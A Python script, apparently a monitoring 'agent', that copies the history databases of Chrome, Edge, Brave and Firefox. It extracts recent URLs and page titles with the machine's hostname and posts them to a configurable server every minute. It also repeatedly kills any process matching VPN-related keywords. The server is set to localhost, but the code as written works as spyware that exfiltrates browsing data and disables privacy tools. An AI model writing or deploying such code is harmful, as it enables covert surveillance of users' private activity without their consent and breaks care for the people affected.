import os
import sqlite3
import time
import psutil
import socket
import requests
from datetime import datetime
import shutil

# ================= CONFIG =================
# Replace with your local server URL
SERVER_URL = "http://127.0.0.1:8000/upload"  # <-- Local test server
SLEEP_INTERVAL = 60  # seconds between each extraction
# ==========================================

VPN_KEYWORDS = [
    "nordvpn", "expressvpn", "surfshark", "openvpn", "tunnelblick",
    "protonvpn", "windscribe", "vpntunnel", "vpnc", "vpn"
]

def kill_vpn_processes():
    """Optional: Kill any running VPN processes using keywords"""
    for proc in psutil.process_iter(['name', 'exe']):
        try:
            name = (proc.info['name'] or "").lower()
            exe_path = (proc.info['exe'] or "").lower()
            if any(keyword in name or keyword in exe_path for keyword in VPN_KEYWORDS):
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

def is_vpn_active():
    """Detect VPN adapters (optional, can skip if not blocking)"""
    adapters = [n for n in psutil.net_if_addrs().keys()]
    vpn_keywords = ["tap", "tun", "ppp", "wg", "vpn"]
    return any(any(k in a.lower() for k in vpn_keywords) for a in adapters)

def detect_browsers():
    """Automatically detect installed browsers and their history DB paths"""
    browsers_found = {}
    local = os.getenv("LOCALAPPDATA")
    appdata = os.getenv("APPDATA")

    # Chrome
    chrome_path = os.path.join(local, "Google\\Chrome\\User Data\\Default\\History")
    if os.path.exists(chrome_path):
        browsers_found["Chrome"] = chrome_path

    # Edge
    edge_path = os.path.join(local, "Microsoft\\Edge\\User Data\\Default\\History")
    if os.path.exists(edge_path):
        browsers_found["Edge"] = edge_path

    # Brave
    brave_path = os.path.join(local, "BraveSoftware\\Brave-Browser\\User Data\\Default\\History")
    if os.path.exists(brave_path):
        browsers_found["Brave"] = brave_path

    # Firefox (multiple profiles)
    firefox_root = os.path.join(appdata, "Mozilla\\Firefox\\Profiles")
    if os.path.exists(firefox_root):
        profiles = [os.path.join(firefox_root, p, "places.sqlite")
                    for p in os.listdir(firefox_root)
                    if os.path.isdir(os.path.join(firefox_root, p))]
        for idx, db in enumerate(profiles):
            browsers_found[f"Firefox_{idx+1}"] = db

    return browsers_found

def extract_history(db_path, browser):
    """Copy and extract URLs from browser history DB"""
    temp_path = f"{browser}_temp.db"
    data = []
    try:
        if os.path.exists(db_path):
            shutil.copy2(db_path, temp_path)
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50"
            )
            rows = cursor.fetchall()
            conn.close()
            os.remove(temp_path)

            for r in rows:
                data.append({
                    "browser": browser,
                    "url": r[0],
                    "title": r[1],
                    "timestamp": datetime.now().isoformat(),
                    "system_name": socket.gethostname()
                })
    except Exception as e:
        print(f"[{browser}] Error: {e}")
    return data

def send_to_server(all_data):
    """Send extracted data to server"""
    if not all_data:
        return
    try:
        response = requests.post(SERVER_URL, json=all_data, timeout=10)
        if response.status_code == 200:
            print(f"[+] Sent {len(all_data)} records to server")
        else:
            print(f"[!] Server responded with {response.status_code}")
    except Exception as e:
        print(f"[!] Failed to send data: {e}")

def main():
    print("=== Browser History Agent Started ===")
    last_vpn_kill = 0

    while True:
        current_time = time.time()
        # Kill VPN processes every interval (optional)
        if current_time - last_vpn_kill > 5:
            kill_vpn_processes()
            last_vpn_kill = current_time

        if is_vpn_active():
            print("[!] VPN adapter detected — skipping extraction")
        else:
            all_data = []
            browsers = detect_browsers()
            for browser, path in browsers.items():
                all_data += extract_history(path, browser)

            if all_data:
                send_to_server(all_data)
            else:
                print("[!] No data extracted this interval")

        time.sleep(SLEEP_INTERVAL)

if __name__ == "__main__":
    main()
